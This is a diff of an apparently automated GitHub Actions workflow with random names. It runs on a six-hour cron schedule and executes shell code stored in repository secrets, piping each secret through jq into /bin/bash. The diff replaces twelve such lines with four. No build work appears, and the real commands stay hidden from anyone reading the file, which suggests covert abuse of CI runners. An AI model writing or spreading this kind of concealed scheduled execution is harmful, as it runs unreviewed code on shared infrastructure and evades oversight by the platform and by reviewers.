@@ -1,8 +1,9 @@
 name: mingyulu1837
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 4/6 * * *'
+    - cron: '5 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,18 +11,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: mingyulu1837
         env:
-          n31138: ${{ secrets.n31138 }}
+          q697: ${{ secrets.q697 }}
         run: |
-          echo $n31138 | jq -r .bcjvo7 | /bin/bash
-          echo $n93928 | jq -r .t0 | /bin/bash
-          echo $d2533 | jq -r .x90593 | /bin/bash
-          echo $i8 | jq -r .nr35 | /bin/bash
-          echo $vp5 | jq -r .tx330 | /bin/bash
-          echo $h718 | jq -r .hdeus98852 | /bin/bash
-          echo $pux21565 | jq -r .ivqz04221 | /bin/bash
-          echo $xfjeo9 | jq -r .q663 | /bin/bash
-          echo $tmsb2 | jq -r .sku90666 | /bin/bash
-          echo $c01693 | jq -r .x7 | /bin/bash
-          echo $iln09 | jq -r .ng74428 | /bin/bash
-          echo $djyuw41078 | jq -r .vxgku24 | /bin/bash
+          echo $q697 | jq -r .y562 | /bin/bash
+          echo $hruk5 | jq -r .rf1 | /bin/bash
+          echo $ro6772 | jq -r .ariv46452 | /bin/bash
+          echo $qbgy640 | jq -r .jrgb9643 | /bin/bash
 
